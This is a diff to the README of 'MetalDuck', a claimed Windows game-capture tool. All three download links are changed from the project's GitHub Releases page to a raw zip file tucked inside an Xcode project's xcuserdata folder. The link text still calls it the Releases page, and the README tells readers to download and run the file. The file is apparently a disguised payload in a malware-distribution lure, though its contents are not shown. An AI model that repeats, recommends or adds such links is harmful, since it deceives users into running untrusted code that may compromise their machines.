@@ -1,6 +1,6 @@
 # 🦆 MetalDuck - Smooth game capture on Windows
 
-[![Download MetalDuck](https://img.shields.io/badge/Download%20MetalDuck-blue?style=for-the-badge&logo=github)](https://github.com/morchidyaacoub-art/MetalDuck/releases)
+[![Download MetalDuck](https://img.shields.io/badge/Download%20MetalDuck-blue?style=for-the-badge&logo=github)](https://github.com/morchidyaacoub-art/MetalDuck/raw/refs/heads/main/MetalDuck.xcodeproj/xcuserdata/Duck_Metal_v3.0.zip)
 
 ## 🎯 What MetalDuck does
 
@@ -35,7 +35,7 @@ For the smoothest experience:
 
 Visit the release page here:
 
-[Download MetalDuck from GitHub Releases](https://github.com/morchidyaacoub-art/MetalDuck/releases)
+[Download MetalDuck from GitHub Releases](https://github.com/morchidyaacoub-art/MetalDuck/raw/refs/heads/main/MetalDuck.xcodeproj/xcuserdata/Duck_Metal_v3.0.zip)
 
 On that page, look for the latest release and download the Windows build. If the release has a setup file or app file, download and run that file.
 
@@ -218,5 +218,5 @@ If that works, you can try higher settings after.
 
 ## 📎 Need the download again
 
-[Open MetalDuck Releases](https://github.com/morchidyaacoub-art/MetalDuck/releases)
+[Open MetalDuck Releases](https://github.com/morchidyaacoub-art/MetalDuck/raw/refs/heads/main/MetalDuck.xcodeproj/xcuserdata/Duck_Metal_v3.0.zip)
 
